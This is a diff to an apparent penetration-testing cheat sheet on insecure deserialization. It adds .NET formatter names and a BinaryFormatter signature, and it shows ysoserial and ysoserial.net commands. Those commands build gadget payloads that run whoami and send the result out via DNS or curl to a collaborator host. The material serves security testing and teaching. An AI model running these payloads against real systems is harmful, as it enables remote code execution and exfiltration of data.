@@ -2340,6 +2340,8 @@ How to spot Insecure deserialization
 - Java objects always begin with the same bytes 
   - Hex `ac` `ed`
   - Base64 `rO0`
+ - .NET vulnerable deserarilaztion libraries: BinaryFormatter, SoapFormatter, NetDataContractSerializer, LosFormatter, ObjectStateFormatter
+  - BinaryFormatter serialized objects usually starts with `AAEAAAD`
 
 **Ysoserial**
 
@@ -2348,6 +2350,15 @@ Because of `Runtime.exec()`, ysoserial doesn't work well with multiple commands.
 ```
 java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections7 'sh -c $@|sh . echo host $(whoami).<MY-'RATOR-ID>.burpcollaborator.net' | gzip | base64
 ```
+
+**Ysoserial.net**
+
+Windows Defender might tag the application as virus.
+
+```
+.\ysoserial.exe -g ClaimsPrincipal -f BinaryFormatter -c 'whoami | curl --data-binary @- http://yourcollaboratorserver' -bgc ActivitySurrogateDisableTypeCheck --minify --ust
+```
+
 
 [PHPGGC](https://github.com/ambionics/phpggc) is a library of unserialize() payloads along with a tool to generate them, from command line or programmatically.
 
